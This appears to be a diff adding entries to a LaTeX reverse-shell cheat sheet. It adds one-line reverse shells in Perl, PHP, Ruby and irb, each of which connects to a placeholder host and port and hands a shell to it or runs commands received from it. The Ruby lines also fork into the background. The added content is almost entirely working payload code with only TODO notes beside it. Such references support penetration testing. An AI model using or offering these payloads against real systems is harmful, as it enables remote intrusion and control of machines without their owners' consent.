@@ -126,9 +126,32 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port |\port|
 
 \subsection{Perl}
 
+\begin{cmdline}{bash}{|}{perl}{}
+perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in(|\port|,inet_aton("|\host|")))){ open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("|\shell|");};'
+\end{cmdline}
+\TODO{dependencies}
+
 \subsection{PHP}
 
-\subsection{Ruby}
+\begin{cmdline}{bash}{|}{php}{}
+php -r '$sock=fsockopen("|\host|",|\port|); exec("|\shell| <&3 >&3 2>&3");'
+\end{cmdline}
+%$
+\TODO{dependencies}
+
+\subsection{Ruby (\texttt{ruby})}
+
+\begin{cmdline}{bash}{^}{ruby}{}
+ruby -rsocket -e 'exit if fork; c=TCPSocket.new("^\host^",^\port^); while(cmd=c.gets); IO.popen(cmd,"r"){|io|c.print io.read} end'
+\end{cmdline}
+\TODO{dependencies}
+
+\subsubsection{Interactive Ruby Shell (\texttt{irb})}
+
+\begin{cmdline}{bash}{^}{echo,irb}{}
+echo 'require "socket"; exit if fork; c=TCPSocket.new("^\host^",^\port^); while(cmd=c.gets); IO.popen(cmd,"r"){|io|c.print io.read} end' | irb
+\end{cmdline}
+\TODO{dependencies}
 
 \subsection{Node.js (\texttt{node})}
 
